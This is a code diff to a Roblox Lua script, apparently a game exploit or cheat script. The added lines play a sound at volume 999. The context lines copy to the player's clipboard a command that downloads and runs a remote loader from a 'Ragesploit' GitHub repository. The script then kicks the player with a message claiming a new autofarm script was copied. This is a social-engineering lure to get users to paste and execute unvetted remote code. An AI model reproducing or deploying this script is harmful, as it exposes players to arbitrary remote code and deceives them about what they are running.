@@ -103,5 +103,15 @@ L   ;::::::|                     \    \::.  . . .:L. . ; . ; . ; .;./
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
+local SoundService = game:GetService("SoundService")
+
+local music = Instance.new("Sound")
+music.SoundId = "rbxassetid://6442194290"
+music.Volume = 999
+music.Parent = workspace
+
+music.Loaded:Wait()
+music:Play()
+
 setclipboard('loadstring(game:HttpGet("https://raw.githubusercontent.com/RagespIoit-x/Ragesploit/refs/heads/main/MainScript/Loader.lua"))()')
 player:Kick("Event ended😥 New autofarm script copied to clipboard")
